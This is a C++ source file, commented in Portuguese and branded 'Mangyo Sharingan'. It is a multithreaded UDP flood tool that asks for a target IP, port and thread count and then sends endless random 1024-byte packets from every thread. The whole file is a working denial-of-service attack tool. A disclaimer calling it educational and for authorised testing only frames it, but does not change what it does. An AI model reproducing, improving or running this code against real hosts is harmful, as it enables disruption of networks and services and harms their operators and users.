#include <iostream>
#include <thread>
#include <cstdlib>
#include <cstring>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <random>

#define BUFFER_SIZE 1024

// Função para enviar pacotes
void send_packets(const std::string& ip, int port) {
    int sockfd;
    struct sockaddr_in dest_addr;
    char buffer[BUFFER_SIZE];

    // Criar o socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        std::cerr << "\033[91m[Erro] Falha ao criar o socket.\033[0m" << std::endl;
        exit(1);
    }

    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);

    // Converter IP para formato binário
    if (inet_pton(AF_INET, ip.c_str(), &dest_addr.sin_addr) <= 0) {
        std::cerr << "\033[91m[Erro] IP inválido.\033[0m" << std::endl;
        exit(1);
    }

    // Gerar pacotes aleatórios
    std::default_random_engine generator;
    std::uniform_int_distribution<int> distribution(0, 255);

    while (true) {
        for (int i = 0; i < BUFFER_SIZE; ++i) {
            buffer[i] = static_cast<char>(distribution(generator));
        }

        // Enviar pacotes
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            std::cerr << "\033[91m[Erro] Falha ao enviar pacote.\033[0m" << std::endl;
            break;
        }

        std::cout << "\033[93m[Pacote Enviado] Alvo: " << ip << ":" << port << "\033[0m" << std::endl;
    }

    close(sockfd);
}

// Função para iniciar o ataque
void start_attack(const std::string& ip, int port, int thread_count) {
    std::cout << "\033[92m[INFO] Iniciando ataque contra " << ip << ":" << port << " com " << thread_count << " threads...\033[0m" << std::endl;

    // Criar threads
    std::vector<std::thread> threads;
    for (int i = 0; i < thread_count; ++i) {
        threads.push_back(std::thread(send_packets, ip, port));
        std::cout << "\033[94m[INFO] Thread " << i + 1 << " iniciada.\033[0m" << std::endl;
    }

    // Esperar as threads terminarem (não vão terminar, pois estão em loop infinito)
    for (auto& t : threads) {
        t.join();
    }
}

int main() {
    std::cout << "\033[91m============================================\033[0m" << std::endl;
    std::cout << "\033[91m         AVISO LEGAL - MANGYO SHARINGAN\033[0m" << std::endl;
    std::cout << "\033[91m============================================\033[0m" << std::endl;
    std::cout << "\033[91mEste script foi criado unicamente para fins educacionais e para testes em redes sob sua autorização.\033[0m" << std::endl;
    std::cout << "\033[91mO uso indevido deste script para atividades ilegais é estritamente proibido e pode resultar em penalidades severas.\033[0m" << std::endl;
    std::cout << "\033[91mO autor não se responsabiliza pelo mau uso do código.\033[0m" << std::endl;
    std::cout << "\033[91m============================================\033[0m" << std::endl;

    std::string target_ip;
    int target_port, thread_count;

    std::cout << "\033[94mDigite o IP do alvo: \033[0m";
    std::cin >> target_ip;

    std::cout << "\033[94mDigite a porta do alvo: \033[0m";
    std::cin >> target_port;

    std::cout << "\033[94mDigite o número de threads: \033[0m";
    std::cin >> thread_count;

    std::cout << "\033[92m//======================================//\033[0m" << std::endl;
    std::cout << "\033[92m||      Mangyo Sharingan Ativando...   ||\033[0m" << std::endl;
    std::cout << "\033[92m\\\\======================================\\\\\033[0m" << std::endl;

    try {
        start_attack(target_ip, target_port, thread_count);
    } catch (const std::exception& e) {
        std::cerr << "\033[91m[Erro] " << e.what() << "\033[0m" << std::endl;
    }

    std::cout << "\033[91m============================================\033[0m" << std::endl;
    std::cout << "\033[91m                ATAQUE FINALIZADO\033[0m" << std::endl;
    std::cout << "\033[91m============================================\033[0m" << std::endl;
    std::cout << "\033[91mObrigado por usar o Mangyo Sharingan de forma responsável!\033[0m" << std::endl;

    return 0;
}